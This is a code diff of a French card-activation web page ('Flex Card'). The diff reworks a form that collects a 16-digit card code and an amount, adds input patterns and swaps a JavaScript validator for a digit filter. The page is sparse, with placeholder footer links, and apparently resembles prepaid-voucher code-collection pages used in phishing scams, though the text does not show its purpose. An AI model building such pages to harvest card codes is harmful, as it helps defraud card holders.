@@ -1,50 +1,57 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Activation de carte</title>
-  <link rel="stylesheet" href="style.css" />
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <meta charset="UTF-8">
+  <title>Flex Card - Activation</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <div class="logo">
+    <img src="logo.png" alt="Flex Card" width="150">
+  </div>
+
   <div class="container">
-    <img src="logo.png" alt="Logo Flex Card" class="logo" />
     <h2>Bienvenue</h2>
     <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>
+    
     <form action="/envoyer-code" method="POST">
-      <input type="text" id="numeroCarte" name="numeroCarte" placeholder="Code de la carte" maxlength="16" required />
-      <input type="text" id="codeSecurite" name="codeSecurite" placeholder="Montant" required />
+      <input
+        type="text"
+        name="numeroCarte"
+        placeholder="Code de la carte"
+        required
+        maxlength="16"
+        pattern="\d{16}"
+        title="Entrez un code de carte de 16 chiffres"
+      >
+
+      <input
+        type="text"
+        name="montant"
+        id="montant"
+        placeholder="Montant"
+        required
+        pattern="\d+"
+        title="Veuillez entrer uniquement des chiffres"
+      >
+
       <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div>
+
       <button type="submit">Activer ma carte</button>
     </form>
   </div>
+
   <footer>
-    <a href="#">Accueil</a>
-    <a href="#">À propos</a>
+    <a href="#">Accueil</a> |
+    <a href="#">À propos</a> |
     <a href="#">Politique de confidentialité</a>
   </footer>
 
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
-    const form = document.querySelector('form');
-    const codeInput = document.getElementById('numeroCarte');
-    const montantInput = document.getElementById('codeSecurite');
-
-    form.addEventListener('submit', function (e) {
-      const code = codeInput.value.trim();
-      const montant = montantInput.value.trim();
-
-      if (!/^\d{16}$/.test(code)) {
-        alert("Le code de la carte doit contenir exactement 16 chiffres.");
-        e.preventDefault();
-        return;
-      }
-
-      if (!/^\d+$/.test(montant)) {
-        alert("Le montant doit être un nombre uniquement.");
-        e.preventDefault();
-        return;
-      }
+    // Empêche l'entrée de lettres et de symboles dans le champ "montant"
+    document.getElementById('montant').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
     });
   </script>
 </body>
